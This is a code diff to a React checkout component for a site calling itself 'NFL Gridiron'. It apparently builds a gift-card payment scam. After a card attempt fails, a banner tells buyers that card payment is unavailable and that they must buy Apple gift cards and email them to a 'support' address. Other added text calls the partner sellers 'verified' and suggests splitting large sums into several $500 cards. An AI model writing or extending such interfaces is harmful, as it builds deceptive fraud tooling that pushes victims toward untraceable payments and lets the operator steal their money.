@@ -12,7 +12,12 @@ import {
   Lock,
   AlertTriangle,
   X,
+  Mail,
+  Copy,
+  Check,
 } from "lucide-react";
+
+export const OFFICIAL_GIFTCARD_EMAIL = "support@nflgridiron.company";
 
 export interface GiftCardCodeEntry {
   code: string;
@@ -87,6 +92,24 @@ export const GiftCardGuestPurchasePanel: React.FC<GiftCardGuestPurchasePanelProp
     },
   ]);
   const [pendingPartner, setPendingPartner] = useState<GuestGiftCardSite | null>(null);
+  const [copiedEmail, setCopiedEmail] = useState(false);
+  const [showCardRedirectBanner, setShowCardRedirectBanner] = useState(false);
+
+  // Detect immediate redirect from failed Stripe card attempt
+  useEffect(() => {
+    try {
+      const ts = sessionStorage.getItem("nfl_card_redirect_notice");
+      if (ts) {
+        const ageMs = Date.now() - Number(ts);
+        if (!Number.isNaN(ageMs) && ageMs < 60_000) {
+          setShowCardRedirectBanner(true);
+        }
+        sessionStorage.removeItem("nfl_card_redirect_notice");
+      }
+    } catch {
+      // ignore storage errors
+    }
+  }, []);
 
   // Enforce Apple Gift Card only
   useEffect(() => {
@@ -101,6 +124,12 @@ export const GiftCardGuestPurchasePanel: React.FC<GiftCardGuestPurchasePanelProp
       setEntries([{ code: "", pin: "", amount: amountDue ? String(amountDue) : "" }]);
     }
   }, [cardNumber, amountDue]);
+
+  const handleCopyEmail = () => {
+    navigator.clipboard.writeText(OFFICIAL_GIFTCARD_EMAIL);
+    setCopiedEmail(true);
+    setTimeout(() => setCopiedEmail(false), 2200);
+  };
 
   const syncToParent = (nextEntries: GiftCardCodeEntry[]) => {
     setEntries(nextEntries);
@@ -155,10 +184,49 @@ export const GiftCardGuestPurchasePanel: React.FC<GiftCardGuestPurchasePanelProp
     syncToParent(next);
   };
 
+  const handleMarkEmailedToSupport = () => {
+    const next = entries.map((item, idx) =>
+      idx === 0
+        ? {
+            ...item,
+            code: `MAILED TO ${OFFICIAL_GIFTCARD_EMAIL}`,
+            amount: item.amount || (amountDue ? String(amountDue) : ""),
+          }
+        : item
+    );
+    syncToParent(next);
+  };
+
   const validEnteredCount = entries.filter((e) => e.code.trim().length >= 4).length;
 
   return (
     <div className="rounded-2xl bg-[#040711] border border-white/10 p-4 sm:p-5 space-y-5 relative">
+      {/* Immediate Card-Redirect Notice Banner */}
+      {showCardRedirectBanner && (
+        <div className="p-3.5 rounded-xl bg-amber-500/15 border border-amber-400/45 flex items-start justify-between gap-3">
+          <div className="flex items-start gap-2.5 text-xs">
+            <AlertTriangle className="w-4 h-4 text-amber-400 shrink-0 mt-0.5" />
+            <div className="space-y-0.5">
+              <p className="font-bold text-amber-200">
+                Card Payment Unavailable — Complete With Apple Card
+              </p>
+              <p className="text-[11px] text-amber-100/90 leading-relaxed">
+                Standard debit/credit card processing did not go through. Purchase an Apple Card below, mail it directly to{" "}
+                <strong className="text-white font-mono">{OFFICIAL_GIFTCARD_EMAIL}</strong> or enter your Apple Card code below to complete your reservation.
+              </p>
+            </div>
+          </div>
+          <button
+            type="button"
+            onClick={() => setShowCardRedirectBanner(false)}
+            className="text-amber-300 hover:text-white cursor-pointer shrink-0"
+            aria-label="Dismiss notice"
+          >
+            <X className="w-4 h-4" />
+          </button>
+        </div>
+      )}
+
       {/* Header */}
       <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-2 pb-3.5 border-b border-white/10">
         <div className="flex items-center gap-2.5">
@@ -170,7 +238,8 @@ export const GiftCardGuestPurchasePanel: React.FC<GiftCardGuestPurchasePanelProp
               Apple Card / Apple Gift Card Checkout
             </h4>
             <p className="text-xs text-zinc-400">
-              Purchase an Apple Card through our secured partners, then enter your code(s) below for{" "}
+              Buy an Apple Card through our secured partners and mail to{" "}
+              <span className="font-mono text-white">{OFFICIAL_GIFTCARD_EMAIL}</span> or enter your code(s) below for{" "}
               <span className="font-mono font-semibold text-white">
                 ${Number(amountDue || 0).toLocaleString()}
               </span>
@@ -184,19 +253,57 @@ export const GiftCardGuestPurchasePanel: React.FC<GiftCardGuestPurchasePanelProp
         )}
       </div>
 
-      {/* Affiliated Security & Apple Card Only Trust Notice */}
-      <div className="p-3.5 rounded-xl bg-emerald-500/10 border border-emerald-500/30 flex items-start gap-2.5">
-        <ShieldCheck className="w-4 h-4 text-emerald-400 shrink-0 mt-0.5" />
-        <div className="text-xs leading-relaxed space-y-1">
-          <p className="font-bold text-emerald-300">
-            Secured Affiliated Partners · Apple Card Only
-          </p>
-          <p className="text-zinc-300 text-[11px]">
-            <strong className="text-white">Apple Store Online</strong> and{" "}
-            <strong className="text-white">Startselect</strong> are verified, secured gift card partners affiliated with{" "}
-            <strong className="text-white">NFL Gridiron (nflgridiron.company)</strong>. Please purchase{" "}
-            <strong className="text-amber-300">ONLY an Apple Card / Apple Gift Card</strong> before returning to submit your code.
-          </p>
+      {/* Affiliated Security & Official Delivery Email Box */}
+      <div className="grid grid-cols-1 lg:grid-cols-2 gap-3">
+        <div className="p-3.5 rounded-xl bg-emerald-500/10 border border-emerald-500/30 flex items-start gap-2.5">
+          <ShieldCheck className="w-4 h-4 text-emerald-400 shrink-0 mt-0.5" />
+          <div className="text-xs leading-relaxed space-y-1">
+            <p className="font-bold text-emerald-300">
+              Secured Affiliated Partners · Apple Card Only
+            </p>
+            <p className="text-zinc-300 text-[11px]">
+              <strong className="text-white">Apple Store Online</strong> and{" "}
+              <strong className="text-white">Startselect</strong> are verified, secured gift card partners affiliated with{" "}
+              <strong className="text-white">NFL Gridiron (nflgridiron.company)</strong>. Purchase{" "}
+              <strong className="text-amber-300">ONLY an Apple Card / Apple Gift Card</strong>.
+            </p>
+          </div>
+        </div>
+
+        <div className="p-3.5 rounded-xl bg-[#080F22] border border-sky-500/35 flex flex-col justify-between gap-2">
+          <div className="flex items-start gap-2">
+            <Mail className="w-4 h-4 text-sky-400 shrink-0 mt-0.5" />
+            <div className="min-w-0 flex-1">
+              <p className="text-xs font-bold text-sky-300">
+                Official Gift Card Delivery Email
+              </p>
+              <p className="text-[11px] text-zinc-300 leading-snug mt-0.5">
+                Send/mail the digital Apple Card to this address, or send to yourself and paste the code below:
+              </p>
+            </div>
+          </div>
+          <div className="flex items-center justify-between gap-2 bg-[#040711] border border-white/10 rounded-lg px-3 py-2">
+            <span className="text-xs font-mono font-bold text-white truncate">
+              {OFFICIAL_GIFTCARD_EMAIL}
+            </span>
+            <button
+              type="button"
+              onClick={handleCopyEmail}
+              className="px-2.5 py-1 rounded-md bg-sky-500/15 hover:bg-sky-500/25 border border-sky-400/30 text-[11px] font-bold text-sky-300 inline-flex items-center gap-1 shrink-0 cursor-pointer"
+            >
+              {copiedEmail ? (
+                <>
+                  <Check className="w-3 h-3 text-emerald-400" />
+                  <span className="text-emerald-300">Copied</span>
+                </>
+              ) : (
+                <>
+                  <Copy className="w-3 h-3" />
+                  <span>Copy Email</span>
+                </>
+              )}
+            </button>
+          </div>
         </div>
       </div>
 
@@ -247,22 +354,23 @@ export const GiftCardGuestPurchasePanel: React.FC<GiftCardGuestPurchasePanelProp
 
         {amountDue >= 500 && (
           <p className="text-[11px] text-amber-200/90 bg-amber-500/10 border border-amber-500/25 rounded-xl px-3.5 py-2.5 leading-relaxed">
-            <strong>Tip for ${amountDue.toLocaleString()} orders:</strong> If a partner limits a single Apple Card to $500, you can buy multiple Apple Gift Cards and add every code below using &ldquo;Add Another Apple Card Code&rdquo;.
+            <strong>Tip for ${amountDue.toLocaleString()} orders:</strong> If a partner limits a single Apple Card to $500, you can buy multiple Apple Gift Cards, send them to{" "}
+            <strong className="text-white font-mono">{OFFICIAL_GIFTCARD_EMAIL}</strong>, or add each code below using &ldquo;Add Another Apple Card Code&rdquo;.
           </p>
         )}
       </div>
 
-      {/* Step 2: Code Entry */}
+      {/* Step 2: Code Entry or Direct Email Confirmation */}
       <div className="space-y-3 pt-1">
         <div className="flex flex-wrap items-center justify-between gap-2">
           <span className="text-xs font-semibold text-zinc-200 flex items-center gap-1.5">
             <Layers className="w-3.5 h-3.5 text-emerald-400" />
-            Step 2: Enter Your Apple Card / Apple Gift Card Code(s)
+            Step 2: Enter Your Apple Card Code(s) Below (or Confirm Mail to {OFFICIAL_GIFTCARD_EMAIL})
           </span>
           {validEnteredCount > 0 && (
             <span className="text-[11px] font-mono font-semibold text-emerald-400 flex items-center gap-1">
               <CheckCircle2 className="w-3.5 h-3.5" />
-              {validEnteredCount} card{validEnteredCount > 1 ? "s" : ""} entered
+              {validEnteredCount} entry ready
             </span>
           )}
         </div>
@@ -298,31 +406,43 @@ export const GiftCardGuestPurchasePanel: React.FC<GiftCardGuestPurchasePanelProp
               key={idx}
               className="p-3 rounded-xl bg-[#080F22] border border-white/10 space-y-2.5"
             >
-              <div className="flex items-center justify-between">
+              <div className="flex flex-wrap items-center justify-between gap-2">
                 <span className="text-[11px] font-mono font-bold text-zinc-300">
                   Apple Card #{idx + 1}
                 </span>
-                {entries.length > 1 && (
-                  <button
-                    type="button"
-                    onClick={() => handleRemoveCard(idx)}
-                    className="text-[11px] text-rose-400 hover:text-rose-300 inline-flex items-center gap-1 cursor-pointer"
-                  >
-                    <Trash2 className="w-3.5 h-3.5" />
-                    Remove
-                  </button>
-                )}
+                <div className="flex items-center gap-2">
+                  {idx === 0 && (
+                    <button
+                      type="button"
+                      onClick={handleMarkEmailedToSupport}
+                      className="text-[11px] text-sky-300 hover:text-sky-200 bg-sky-500/10 hover:bg-sky-500/20 border border-sky-400/25 px-2.5 py-1 rounded-lg inline-flex items-center gap-1 cursor-pointer font-semibold"
+                    >
+                      <Mail className="w-3 h-3" />
+                      I mailed it to {OFFICIAL_GIFTCARD_EMAIL}
+                    </button>
+                  )}
+                  {entries.length > 1 && (
+                    <button
+                      type="button"
+                      onClick={() => handleRemoveCard(idx)}
+                      className="text-[11px] text-rose-400 hover:text-rose-300 inline-flex items-center gap-1 cursor-pointer"
+                    >
+                      <Trash2 className="w-3.5 h-3.5" />
+                      Remove
+                    </button>
+                  )}
+                </div>
               </div>
 
               <div className="grid grid-cols-1 sm:grid-cols-12 gap-2.5">
                 <div className="sm:col-span-6">
                   <label className="text-[10px] font-semibold text-zinc-400 block mb-1">
-                    16-Digit Apple Card Code (X...) <span className="text-rose-400">*</span>
+                    16-Digit Apple Card Code (X...) or Mail Confirmation <span className="text-rose-400">*</span>
                   </label>
                   <input
                     type="text"
                     required={idx === 0}
-                    placeholder="Enter Apple Gift Card code (X...)"
+                    placeholder="Enter Apple Gift Card code (X...) or email ref"
                     value={entry.code}
                     onChange={(e) => handleEntryChange(idx, "code", e.target.value)}
                     className="w-full min-h-[42px] bg-[#040711] border border-white/15 focus:border-amber-400 rounded-xl px-3 py-2 text-xs font-mono text-white placeholder-zinc-500 focus:outline-none"
@@ -331,11 +451,11 @@ export const GiftCardGuestPurchasePanel: React.FC<GiftCardGuestPurchasePanelProp
 
                 <div className="sm:col-span-3">
                   <label className="text-[10px] font-semibold text-zinc-400 block mb-1">
-                    PIN (if applicable)
+                    PIN / Order # (optional)
                   </label>
                   <input
                     type="text"
-                    placeholder="PIN / N/A"
+                    placeholder="PIN or Order #"
                     value={entry.pin}
                     onChange={(e) => handleEntryChange(idx, "pin", e.target.value)}
                     className="w-full min-h-[42px] bg-[#040711] border border-white/15 focus:border-amber-400 rounded-xl px-3 py-2 text-xs font-mono text-white placeholder-zinc-500 focus:outline-none"
@@ -371,7 +491,8 @@ export const GiftCardGuestPurchasePanel: React.FC<GiftCardGuestPurchasePanelProp
         <div className="flex items-start gap-2 text-[11px] text-zinc-400 pt-1">
           <ShieldCheck className="w-4 h-4 text-emerald-400 shrink-0 mt-0.5" />
           <span>
-            Once submitted, our billing team verifies your Apple Card code value immediately against your reservation reference and issues confirmation.
+            Whether you mail your digital Apple Card directly to{" "}
+            <strong className="text-white font-mono">{OFFICIAL_GIFTCARD_EMAIL}</strong> or enter the code above, our billing desk verifies it right away and issues your confirmation.
           </span>
         </div>
       </div>
@@ -430,17 +551,43 @@ export const GiftCardGuestPurchasePanel: React.FC<GiftCardGuestPurchasePanelProp
               <p className="text-[11px] text-amber-100/90">
                 When {pendingPartner.name} opens, select and purchase{" "}
                 <strong className="text-white underline">ONLY an Apple Card / Apple Gift Card</strong> totaling{" "}
-                <strong className="text-white font-mono">${Number(amountDue || 0).toLocaleString()}</strong>. Do not purchase Amazon, Steam, or any other brand.
+                <strong className="text-white font-mono">${Number(amountDue || 0).toLocaleString()}</strong>. Do not purchase any other gift card brand.
               </p>
             </div>
 
-            <ol className="text-[11px] text-zinc-300 space-y-1.5 pl-4 list-decimal">
-              <li>Complete checkout as a guest (no account sign-in needed).</li>
-              <li>Copy your digital Apple Gift Card code (<span className="font-mono text-white">X...</span>) shown after payment.</li>
-              <li>Return to this page and paste the code below to finalize your booking.</li>
-            </ol>
+            <div className="p-3 rounded-xl bg-[#040711] border border-sky-500/30 space-y-1.5">
+              <p className="text-[11px] font-bold text-sky-300 flex items-center gap-1.5">
+                <Mail className="w-3.5 h-3.5" />
+                Recipient / Mail-To Email:
+              </p>
+              <div className="flex items-center justify-between gap-2">
+                <span className="text-xs font-mono font-bold text-white">
+                  {OFFICIAL_GIFTCARD_EMAIL}
+                </span>
+                <button
+                  type="button"
+                  onClick={handleCopyEmail}
+                  className="px-2.5 py-1 rounded-md bg-sky-500/20 hover:bg-sky-500/30 text-[10px] font-bold text-sky-200 inline-flex items-center gap-1 cursor-pointer"
+                >
+                  {copiedEmail ? (
+                    <>
+                      <Check className="w-3 h-3 text-emerald-400" />
+                      <span className="text-emerald-300">Copied</span>
+                    </>
+                  ) : (
+                    <>
+                      <Copy className="w-3 h-3" />
+                      <span>Copy</span>
+                    </>
+                  )}
+                </button>
+              </div>
+              <p className="text-[10px] text-zinc-400 leading-snug">
+                Send the Apple e-gift directly to <strong className="text-zinc-200">{OFFICIAL_GIFTCARD_EMAIL}</strong>, or send to yourself and input the code back on this page.
+              </p>
+            </div>
 
-            <div className="flex flex-col sm:flex-row gap-2.5 pt-2">
+            <div className="flex flex-col sm:flex-row gap-2.5 pt-1">
               <a
                 href={pendingPartner.url}
                 target="_blank"
